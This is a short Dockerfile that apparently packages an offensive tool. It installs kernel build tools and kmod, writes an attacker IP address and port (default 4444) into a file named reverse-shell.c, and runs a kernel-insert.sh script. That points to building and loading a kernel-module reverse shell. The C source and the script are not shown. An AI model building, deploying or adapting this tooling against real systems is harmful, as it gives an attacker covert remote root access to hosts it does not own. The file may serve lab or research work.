FROM ubuntu:latest
ARG IP_ADDRESS=127.0.0.1
ARG PORT_NUMBER=4444
RUN apt update
RUN apt install openssl libssl-dev kmod build-essential -y
COPY . /app/
WORKDIR /app/
RUN sed -i "s/<IPADDRESS>/${IP_ADDRESS}/g" ./reverse-shell.c
RUN sed -i "s/<PORTNUMBER>/${PORT_NUMBER}/g" ./reverse-shell.c
RUN chmod 777 kernel-insert.sh
ENTRYPOINT [ "./kernel-insert.sh" ]